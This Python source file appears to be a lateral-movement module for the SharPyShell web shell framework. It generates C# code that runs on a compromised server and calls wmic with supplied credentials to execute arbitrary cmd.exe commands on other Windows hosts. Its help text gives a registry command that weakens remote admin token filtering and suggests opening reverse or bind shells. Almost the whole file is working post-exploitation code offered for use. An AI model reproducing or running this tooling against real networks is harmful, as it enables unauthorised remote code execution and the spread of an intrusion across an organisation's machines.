from core.Module import Module, ModuleException
from utils.random_string import random_generator
import traceback


class LateralWmiModuleException(ModuleException):
    pass


class Lateral_wmi(Module):
    _exception_class = LateralWmiModuleException
    short_help = "Run builtin WMI command to move laterally"
    complete_help = r"""
        This module run a wmic /node:[ip] command in order to launch commands on a remote windows system.
        This will result in a lateral movement if shared credentials are known.
        
        Note that if you use local admin credentials you should ensure that, on the target server, the feature
        "LocalAccountTokenFilterPolicy" is disabled. (except for builtin Administrator)
        To disable that you need to add the following regkey with the value of 1:
        
        HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy
        
        example command:
            reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
        
        If you use domain users for the lateral movement, no restrictions to the process token will be applied.
        Remember to always specify the domain in the username field. If you use a local account use the machine name as the domain.
        
        This module uses WMI builtin features wmi and doesn't need additional files to be droppend on the target
        server.
        
        Note that, wmi commands don't return stdout/stderr output from the execution of remote processes.
        You should redirect output to a shared resource (i.e. local share with everyone permission) or just spawn
        reverse/bind shell. 
                       
        Usage:
            #lateral_wmi target_ip username password command [local_user] [local_password] [local_domain]
        
        Positional arguments:
            target_ip               the ip of the remote server
            username                username of the user to use to login on the target server 
                                    you can specify domain\username if user is in a domain
            password                password of the user to use to login on the target server
            command                 a command compatible by cmd.exe
                                        
        Examples:
            Lateral movement as privileged current application pool user, output to local shared resource:
                 #lateral_wmi 192.168.56.102 'domain\remote_user1' 'remote_password1' 'whoami /all > C:\Windows\Temp\whoami.txt' 
          
    """

    _runtime_code = r"""
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    public class SharPyShell
                    {                    
                        string LateralWMI(string arg, string working_path)
                        {
                            ProcessStartInfo pinfo = new ProcessStartInfo();
                            pinfo.FileName = Environment.GetEnvironmentVariable("SYSTEMROOT") + "\\system32\\wbem\\wmic.exe";
                            pinfo.Arguments = arg;
                            pinfo.RedirectStandardOutput = true;
                            pinfo.RedirectStandardError = true;
                            pinfo.UseShellExecute = false;
                            pinfo.WorkingDirectory = working_path;
                            Process p = new Process();
                            try{
                                p = Process.Start(pinfo);
                            }
                            catch (Exception e){
                                return "{{{SharPyShellError}}}\n" + e;
                            }
                            StreamReader stmrdr_output = p.StandardOutput;
                            StreamReader stmrdr_errors = p.StandardError;
                            string output = "";
                            string stand_out = stmrdr_output.ReadToEnd();
                            string stand_errors = stmrdr_errors.ReadToEnd();
                            stmrdr_output.Close();
                            stmrdr_errors.Close();
                            if (!String.IsNullOrEmpty(stand_out))
                                output = output + stand_out;
                            if (!String.IsNullOrEmpty(stand_errors))
                                output = output + stand_errors;
                            return output;
                        }

                        public byte[] ExecRuntime()
                        {
                            string output_func=LateralWMI(@"%s", @"%s");
                            byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                            return(output_func_byte);
                        }
                    }
                    """

    __wmi_code_arguments = r'/node:%s /user:""%s"" /password:""%s"" process call create ""cmd.exe /c %s""'

    def __run_as_current_user(self, wmi_code_arguments):
        request = self._create_request(wmi_code_arguments)
        encrypted_request = self._encrypt_request(request)
        encrypted_response = self._post_request(encrypted_request)
        decrypted_response = self._decrypt_response(encrypted_response)
        return decrypted_response

    def __parse_run_args(self, args):
        if len(args) < 4:
            raise self._exception_class('#lateral_wmi: Not enough arguments. 4 Arguments required.\n')
        args_parser = {k: v for k, v in enumerate(args)}
        target_ip = args_parser.get(0)
        username = args_parser.get(1)
        password = args_parser.get(2)
        command = args_parser.get(3)
        return target_ip, username, password, command

    def _create_request(self, args):
        arguments = args
        working_path = self._module_settings['working_directory']
        wmi_code_arguments = arguments
        request = self._runtime_code % (wmi_code_arguments, working_path)
        return request

    def run(self, args):
        try:
            target_ip, username, password, command = self.__parse_run_args(args)
            wmi_code_arguments = self.__wmi_code_arguments % (target_ip, username, password, command)
            response = self.__run_as_current_user(wmi_code_arguments)
            parsed_response = self._parse_response(response)
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' +\
                              str(traceback.format_exc())
        return parsed_response
